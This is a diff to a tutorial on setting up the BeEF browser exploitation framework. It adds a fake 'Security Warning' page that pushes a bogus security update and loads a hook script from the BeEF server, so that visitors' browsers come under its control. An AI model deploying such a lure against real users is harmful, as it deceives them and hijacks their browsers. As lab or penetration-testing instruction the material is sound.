@@ -37,13 +37,13 @@ $ cd beef/
 $ vim install
 ```
 
-On line 106 are two packages which are not available `gcc-9-base` and `libgcc-9-dev`. You must remove them from `/home/pi/beef/install`!
+On line 106 are two packages which are not available `gcc-9-base` and `libgcc-9-dev`. You must remove them from the file `/home/pi/beef/install`! If you have already installed all packages, you can comment this line.
 
 ```shell
 ...
 if [ "${Distro}" = "Debian" ] || [ "${Distro}" = "Kali" ]; then
    sudo apt-get update
-   sudo apt-get install curl git build-essential openssl libreadline6-dev zlib1g zlib1g-dev libssl-dev libyaml-dev libsqlite3-0 libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev autoconf libc6-dev libncurses5-dev automake libtool bison nodejs libcurl4-openssl-dev gcc-9-base libgcc-9-dev
+   # sudo apt-get install curl git build-essential openssl libreadline6-dev zlib1g zlib1g-dev libssl-dev libyaml-dev libsqlite3-0 libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev autoconf libc6-dev libncurses5-dev automake libtool bison nodejs libcurl4-openssl-dev gcc-9-base libgcc-9-dev
 ...
 ```
 
@@ -65,5 +65,33 @@ $ vim config.yaml
 $ ./beef
 ```
 
+## Prepare the spoofed domain page
+
+Content of file `/var/www/html/index.html`.
+
+```html
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Security Warning - with security update</title>
+  <link type="text/css" rel="stylesheet" href="styles/style.css">
+</head>
+<body>
+  <div id="warning">
+    <h1>Security Warning</h1>
+    <p>We have detected a serious security problem,<br /> 
+       please install now the free security update!</p>
+  </div>
+  <div id="patch">
+    <span><!-- placeholder security update --></span>
+  </div>
+<script type="text/javascript" src="scripts/script.js"></script>
+<script src="http://192.168.0.1:3000/hook.js"></script>
+</body>
+</html>
+```
+
+Finally open in your browser the URL `http://192.168.0.1:3000/ui/panel`.
 
 
